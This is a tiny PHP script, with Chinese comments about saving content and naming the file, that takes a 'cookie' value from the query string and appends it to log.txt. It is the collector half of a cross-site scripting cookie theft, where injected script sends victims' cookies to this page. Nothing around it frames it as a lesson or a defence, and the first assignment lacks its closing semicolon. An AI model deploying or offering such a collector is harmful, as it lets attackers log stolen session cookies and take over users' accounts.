<?php
    $content = $_GET['cookie']
    //要保存的内容，最好转为json字符串
    $content = json_encode($content);
    //文件名称
    $file = 'log.txt';
    $fp = fopen($file, 'a');
    fwrite($fp, $content);
    fclose($fp);

?>